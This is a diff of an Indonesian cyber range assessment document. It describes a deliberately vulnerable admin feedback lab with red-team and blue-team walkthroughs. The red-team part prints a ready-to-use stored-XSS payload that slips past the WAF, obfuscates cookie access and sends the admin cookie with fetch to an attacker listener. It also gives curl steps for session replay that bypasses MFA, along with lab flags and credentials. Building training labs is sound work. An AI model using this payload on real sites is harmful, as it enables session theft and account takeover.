@@ -1,5 +1,5 @@
-# Practical Assessment — Cyber Range Engineering (Red vs. Blue Lab)
-### Scenario: "Cookies Reuse & MFA Bypass" — Admin Feedback System
+# Practical Assessment - Cyber Range Engineering (Red vs. Blue Lab)
+### Scenario: "Cookies Reuse & MFA Bypass" - Admin Feedback System
 
 **Role:** Cybersecurity Engineer (Lab & Range Developer)
 **Kandidat:** Endin Jorgy
@@ -20,7 +20,7 @@ Feedback System" korporat. Meskipun MFA diterapkan, logika sesi cacat sehingga:
 
 1. **Red Team** dapat menanam **Stored XSS** (menembus WAF sederhana), mencuri cookie
    sesi admin yang tidak `HttpOnly`, lalu **me-replay** cookie tersebut untuk masuk ke
-   `/dashboard` **tanpa melewati MFA** (session replay → MFA bypass).
+   `/dashboard` **tanpa melewati MFA** (session replay -> MFA bypass).
 2. **Blue Team** memperoleh **telemetry log forensik** (`access.log` + `error.log` di
    `/opt/admin/logs`) yang menceritakan kronologi serangan secara presisi, untuk
    incident response & threat hunting.
@@ -47,7 +47,7 @@ SSH Blue Team di **port 2275**.
                  │            ▲                      │  flaw        │                              │
                  │            │ memicu XSS           └──────────────┘                              │
                  │   ┌─────────────────┐                                                          │
-                 │   │ admin-bot       │  login (password+MFA) → buka /dashboard berkala          │
+                 │   │ admin-bot       │  login (password+MFA) -> buka /dashboard berkala          │
                  │   │ (Playwright)    │  = KORBAN yang cookie adm_sess-nya dicuri XSS            │
                  │   └─────────────────┘                                                          │
                  │                                                                                │
@@ -65,7 +65,7 @@ SSH Blue Team di **port 2275**.
 
 **Mengapa ada `admin-bot`?** Serangan XSS memerlukan korban yang memiliki cookie admin
 valid. Bot login penuh (password + MFA) untuk mendapat cookie `adm_sess`, lalu membuka
-`/dashboard` secara berkala — di titik itulah payload XSS Red Team tereksekusi di konteks
+`/dashboard` secara berkala - di titik itulah payload XSS Red Team tereksekusi di konteks
 admin dan cookie-nya terkirim (exfil) ke listener penyerang.
 
 ---
@@ -77,7 +77,7 @@ admin dan cookie-nya terkirim (exfil) ke listener penyerang.
 | OS Linux + Docker/Compose | Ubuntu VM + `docker-compose.yml` (3 service) |
 | Otomatis & deployable di 1 VM Proxmox | `scripts/bootstrap.sh` + `cloud-init/user-data` |
 | Network zone `feedback.admin.local` | alias network pada compose + `server_name` nginx |
-| Web app HTTP **port 3075** | nginx `listen 3075` → proxy ke app `3075` |
+| Web app HTTP **port 3075** | nginx `listen 3075` -> proxy ke app `3075` |
 | SSH **port 2275** (analyst / blue_team_rocks) | dibuat oleh `bootstrap.sh` (user + `Port 2275`) |
 
 ### Kredensial & Akses Lab
@@ -106,33 +106,33 @@ Aplikasi dikembangkan menyerupai produk nyata agar skenario lebih realistis:
 
 ## 4. Red Team Attack Path (Requirement #2)
 
-### FASE 1 — Reconnaissance
-- **Header `X-Powered-By: Node.js`** sengaja di-set (`server.js`) → membocorkan backend.
+### FASE 1 - Reconnaissance
+- **Header `X-Powered-By: Node.js`** sengaja di-set (`server.js`) -> membocorkan backend.
 - **`/robots.txt`** men-`Disallow` `/api/verify-mfa` dan `/dashboard`.
 - **Komentar ASCII art** di source `/` memberi petunjuk membaca `robots.txt`.
 - **Cookie pra-autentikasi** `pre_mfa_session = pending_mfa_verification`, `HttpOnly=false`.
 
-### FASE 2 — Defense Evasion (WAF & XSS)
+### FASE 2 - Defense Evasion (WAF & XSS)
 - Endpoint feedback **POST-only** (`/feedback`).
-- **WAF** memblok `<script>` → **HTTP 403**.
+- **WAF** memblok `<script>` -> **HTTP 403**.
 - **Bypass**: elemen HTML5 `<svg onload=...>` lolos (WAF hanya memblok `<script>`).
 - **Obfuscation**: WAF memblok kata `document`/`cookie`, sehingga akses cookie harus
   disamarkan: `window['docu'+'ment']['coo'+'kie']`.
-- Cookie **`HttpOnly=False`** → terbaca JavaScript. **Tidak ada CSP** → `fetch()` bebas
+- Cookie **`HttpOnly=False`** -> terbaca JavaScript. **Tidak ada CSP** -> `fetch()` bebas
   untuk exfiltrasi.
 
 **Payload bypass lengkap (siap pakai):**
 ```html
 <svg onload="fetch('http://10.10.14.50:9000/c?d='+window['docu'+'ment']['coo'+'kie'])">
 ```
-> Tidak mengandung `<script`, kata utuh `document`, maupun `cookie` → **lolos WAF**.
+> Tidak mengandung `<script`, kata utuh `document`, maupun `cookie` -> **lolos WAF**.
 
-### FASE 3 — Initial Access (MFA Bypass & Session Replay)
+### FASE 3 - Initial Access (MFA Bypass & Session Replay)
 - Setiap pengunjung menerima cookie bernama `sess`. Tamu memperoleh nilai
   non-privilege (`guest_...`); sesi admin yang lolos MFA memperoleh nilai berprefix
   **`adm_sess`** (memenuhi `SCENARIO75{adm_sess}`).
 - Otorisasi `/dashboard` **hanya** memeriksa apakah nilai cookie `sess` valid dan
-  berprefix `adm_sess` — **tidak pernah** memanggil `/api/verify-mfa`. Maka penyerang
+  berprefix `adm_sess` - **tidak pernah** memanggil `/api/verify-mfa`. Maka penyerang
   cukup **mengganti nilai cookie `sess` miliknya** dengan nilai `adm_sess_...` curian
   (session replay) untuk masuk **tanpa login dan tanpa MFA**.
 - `/dashboard` memantulkan feedback (XSS) di dalam `<div class="xss-payload">`.
@@ -161,7 +161,7 @@ Aplikasi dikembangkan menyerupai produk nyata agar skenario lebih realistis:
 
 ---
 
-## 5. Blue Team — Telemetry & Log Forensics (Requirement #3)
+## 5. Blue Team - Telemetry & Log Forensics (Requirement #3)
 
 Log disimpan di **`/opt/admin/logs`** (`access.log` format nginx + `error.log`). Script
 **`scripts/inject_logs.py`** menyuntik kronologi serangan yang presisi saat deployment.
@@ -170,15 +170,15 @@ Log disimpan di **`/opt/admin/logs`** (`access.log` format nginx + `error.log`).
 
 | Waktu | Event | File | Indikator |
 |---|---|---|---|
-| 18:30–18:42 | Traffic admin sah dari `192.168.1.100` | access.log | baseline normal |
-| 18:49:01–20 | Recon attacker `10.10.14.50` (UA `Mozilla/5.0`) | access.log | GET `/`, `/robots.txt`, `/dashboard` (302) |
+| 18:30-18:42 | Traffic admin sah dari `192.168.1.100` | access.log | baseline normal |
+| 18:49:01-20 | Recon attacker `10.10.14.50` (UA `Mozilla/5.0`) | access.log | GET `/`, `/robots.txt`, `/dashboard` (302) |
 | **18:50:15** | WAF block `<script>` pertama | error.log | `403`, level error |
 | 18:50:40 | Bypass `<svg>` tersimpan | access.log | POST `/feedback` `200` |
 | **18:51:55** | `/dashboard` diakses, status **200** | access.log | `X-Forwarded-For` = string Base64 (exfil) |
 | **18:53:10** | **Authentication bypass anomaly** | error.log | level **CRITICAL**, cookie reuse |
 
 Catatan kunci: **attacker tidak pernah menyentuh `/api/verify-mfa`** (tidak ada entri
-`/api/verify-mfa` dari `10.10.14.50`) → membuktikan MFA dilewati via session replay.
+`/api/verify-mfa` dari `10.10.14.50`) -> membuktikan MFA dilewati via session replay.
 
 ### Tabel Flag Blue Team
 
@@ -215,15 +215,15 @@ Catatan kunci: **attacker tidak pernah menyentuh `/api/verify-mfa`** (tidak ada 
 ## 6. Walkthrough Red Team (bukti lab berfungsi)
 
 ```bash
-# 1) Recon — bocoran teknologi & path tersembunyi
+# 1) Recon - bocoran teknologi & path tersembunyi
 curl -i http://feedback.admin.local:3075/           # lihat header X-Powered-By: Node.js
 curl http://feedback.admin.local:3075/robots.txt    # Disallow /api/verify-mfa, /dashboard
 
-# 2) Uji WAF — payload <script> diblok (403)
+# 2) Uji WAF - payload <script> diblok (403)
 curl -i -X POST http://feedback.admin.local:3075/feedback \
      -d "name=a&message=<script>alert(1)</script>"   # -> HTTP/1.1 403 Forbidden
 
-# 3) Bypass WAF — payload <svg> + exfil via fetch + obfuscation cookie (tersimpan, 200)
+# 3) Bypass WAF - payload <svg> + exfil via fetch + obfuscation cookie (tersimpan, 200)
 curl -i -X POST http://feedback.admin.local:3075/feedback \
      --data-urlencode "name=a" \
      --data-urlencode "message=<svg onload=\"fetch('http://10.10.14.50:9000/c?d='+window['docu'+'ment']['coo'+'kie'])\">"
@@ -231,7 +231,7 @@ curl -i -X POST http://feedback.admin.local:3075/feedback \
 # 4) admin-bot membuka /dashboard -> XSS tereksekusi -> cookie adm_sess terkirim ke
 #    listener Red Team (mis. `nc -lvnp 9000` atau `python3 -m http.server 9000`).
 
-# 5) Session replay — pakai cookie adm_sess curian untuk masuk dashboard TANPA MFA:
+# 5) Session replay - pakai cookie adm_sess curian untuk masuk dashboard TANPA MFA:
 curl -i http://feedback.admin.local:3075/dashboard \
      -H "Cookie: sess=adm_sess_<nilai_curian>"        # -> 200, muncul div.xss-payload
 #    Flag final terlihat di dashboard: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
@@ -271,23 +271,23 @@ grep "Authentication bypass anomaly" error.log
 #   -> 2026/06/12 18:53:10 [CRITICAL] Authentication bypass anomaly: cookie reuse ...
 ```
 
-**Narasi insiden (untuk presentasi):** lonjakan recon dari `10.10.14.50` → tembok 403 WAF
-saat `<script>` → satu request `200` yang lolos (`<svg>`) → cookie admin ter-exfil (terlihat
-di `X-Forwarded-For`) → sesi `adm_sess` di-replay dari IP penyerang pada 18:51:55 tanpa MFA
-→ deteksi `CRITICAL` cookie reuse pada 18:53:10.
+**Narasi insiden (untuk presentasi):** lonjakan recon dari `10.10.14.50` -> tembok 403 WAF
+saat `<script>` -> satu request `200` yang lolos (`<svg>`) -> cookie admin ter-exfil (terlihat
+di `X-Forwarded-For`) -> sesi `adm_sess` di-replay dari IP penyerang pada 18:51:55 tanpa MFA
+-> deteksi `CRITICAL` cookie reuse pada 18:53:10.
 
 ---
 
 ## 8. Deployment ke Proxmox
 
-**Opsi A — Otomatis penuh (cloud-init):**
+**Opsi A - Otomatis penuh (cloud-init):**
 1. Buat VM Ubuntu 22.04 cloud image di Proxmox.
 2. Lampirkan `cloud-init/user-data` (cukup set `<REPO_URL>` ke repo Anda; password
    user `analyst` di-set otomatis oleh `bootstrap.sh`).
-3. Boot VM → cloud-init membuat user `analyst`, set SSH 2275, clone repo, dan menjalankan
+3. Boot VM -> cloud-init membuat user `analyst`, set SSH 2275, clone repo, dan menjalankan
    `bootstrap.sh` (Docker + lab + inject log) otomatis.
 
-**Opsi B — Manual (VM Ubuntu apa pun, termasuk VirtualBox untuk testing):**
+**Opsi B - Manual (VM Ubuntu apa pun, termasuk VirtualBox untuk testing):**
 ```bash
 sudo apt update && sudo apt install -y git
 git clone <REPO_URL> /opt/cyber-range && cd /opt/cyber-range
@@ -311,12 +311,12 @@ Hasil: web app di `http://<IP-VM>:3075`, SSH Blue Team di `<IP-VM>:2275`.
 | Web app HTTP port 3075 | ✅ | nginx `listen 3075` |
 | SSH port 2275 (analyst/blue_team_rocks) | ✅ | `bootstrap.sh` |
 | Node.js backend | ✅ | `app/server.js` |
-| FASE 1 — semua 6 flag recon | ✅ | `server.js` (header, robots, ASCII, cookie) |
-| FASE 2 — semua 6 flag WAF/XSS | ✅ | fungsi `waf()` + cookie + payload |
-| FASE 3 — semua 4 flag access | ✅ | logika `/dashboard` + flag final |
-| Blue — log di `/opt/admin/logs` | ✅ | nginx + `inject_logs.py` |
-| Blue — script inject attack sequence | ✅ | `scripts/inject_logs.py` |
-| Blue — semua flag forensik (IP, UA, timestamp, dll) | ✅ | tabel Bagian 5 |
+| FASE 1 - semua 6 flag recon | ✅ | `server.js` (header, robots, ASCII, cookie) |
+| FASE 2 - semua 6 flag WAF/XSS | ✅ | fungsi `waf()` + cookie + payload |
+| FASE 3 - semua 4 flag access | ✅ | logika `/dashboard` + flag final |
+| Blue - log di `/opt/admin/logs` | ✅ | nginx + `inject_logs.py` |
+| Blue - script inject attack sequence | ✅ | `scripts/inject_logs.py` |
+| Blue - semua flag forensik (IP, UA, timestamp, dll) | ✅ | tabel Bagian 5 |
 | README deploy + walkthrough Red/Blue | ✅ | `README.md` + dokumen ini |
 
 ---
